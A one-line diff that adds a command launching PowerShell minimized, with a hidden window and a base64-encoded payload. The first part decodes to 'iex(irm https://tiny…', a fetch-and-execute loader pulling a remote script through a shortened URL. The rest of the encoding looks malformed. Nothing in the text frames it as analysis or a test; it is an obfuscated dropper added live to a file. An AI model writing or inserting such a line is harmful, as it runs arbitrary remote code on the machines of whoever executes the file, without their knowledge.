@@ -1,0 +1,1 @@
+@start /min powershell -w h -e aQBlAHgAKABpAHIAbQAgAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHVybC5jb20vNTN1czVhdXgpQA==
